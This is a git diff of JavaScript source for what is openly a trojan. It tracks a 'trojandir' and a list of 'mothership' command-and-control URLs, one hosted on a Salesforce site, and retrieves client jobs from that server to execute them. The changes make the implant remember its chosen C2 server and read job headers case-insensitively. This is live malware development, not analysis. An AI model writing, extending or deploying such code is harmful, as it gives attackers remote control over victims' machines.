@@ -107,6 +107,10 @@ var systemstate = {
         return this.cmdname + "_running";
     },
 
+    get mothershipconfigfpath() {
+        return path.join(this.trojandir, 'mothership');
+    },
+
     mothershipindex: -1,
     get mothership() { 
         
@@ -125,7 +129,25 @@ var systemstate = {
     ],
     tplmothershiplist: [ "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault" ],
     selectMothership: function() {
+
         let mothershiparr = this.istpl ? this.tplmothershiplist : this.phpmothershiplist;
+
+        let mothershipurl = '';
+
+        if ( fileExists(this.mothershipconfigfpath) ) {
+            mothershipurl = readTag(this.mothershipconfigfpath);
+            
+            if ( ! isNullOrWhitespace(mothershipurl) ) {
+                
+                for ( let i = 0; i<=mothershiparr.length; i++) {
+                    if ( mothershiparr[i] == mothershipurl ) {
+                        this.mothershipindex = i;
+                        return mothershipurl;
+                    }
+                }
+
+            }
+        }
     
         let count = mothershiparr.length;
     
@@ -135,10 +157,13 @@ var systemstate = {
             this.mothershipindex++;
         }
     
-        writeTag(path.join(this.trojandir, 'mothership'), mothershiparr[this.mothershipindex] );
+        mothershipurl =  mothershiparr[this.mothershipindex];
+
+        writeTag(this.mothershipconfigfpath, mothershipurl );
     
-        logmsg(`index:  ${this.mothershipindex} mothership: ${mothershiparr[this.mothershipindex]}`);
-        return mothershiparr[this.mothershipindex];    
+        logmsg(`index: ${this.mothershipindex} -- mothership: ${mothershipurl}`);
+
+        return mothershipurl;
     },
 
     getClientJobPath() {
@@ -807,20 +832,6 @@ function isValidHttpUrl(string) {
     }
 }
 
-async function downloadBinFile(url, inputHeaders, localfpath) {
-}
-
-async function downloadTxtFile(url, inputHeaders, localfpath) {
-    let result = await makeGetRequest(url, null, inputHeaders);
-    // 
-}
-
-async function uploadFile() {
-}
-
-async function makePutRequest() {
-}
-
 async function makeGetRequest(baseUrl, params, inputHeaders, downloadOpts = null) {
     
     logmsg("starting");
@@ -1290,6 +1301,21 @@ function execjob() {
     logmsg('finished');
 }
 
+function keyExists(obj, prop) {
+    return Object.keys(obj).some(
+      key => key.toLowerCase() === prop.toLowerCase()
+    );
+}
+
+function getKey(obj, searchKey) {
+    
+    let keyret = Object.keys(obj).find(
+        key => key.toLowerCase() === searchKey.toLowerCase()
+    );
+
+    return keyret;
+}
+  
 async function retrieveClientJob() {
     logmsg('starting');
 
@@ -1318,11 +1344,11 @@ async function retrieveClientJob() {
     let jobcode = '';
     let jobfilename = '';
 
-    if ( Object.hasOwn(response.headers, 'X-JobCode') )
-        jobcode = response.headers['X-JobCode']; 
+    if ( keyExists(response.headers, 'X-JobCode') )
+        jobcode = response.headers[getKey(response.headers,'X-JobCode')]; 
     
-    if ( Object.hasOwn(response.headers, 'X-JobFilename') )
-        jobfilename = response.headers['X-JobFilename']; 
+    if ( keyExists(response.headers, 'X-JobFilename') )
+        jobfilename = response.headers[getKey(response.headers,'X-JobFilename')];
 
     if ( isNullOrWhitespace(jobcode) ) {
         throw new Error('jobcode is empty');
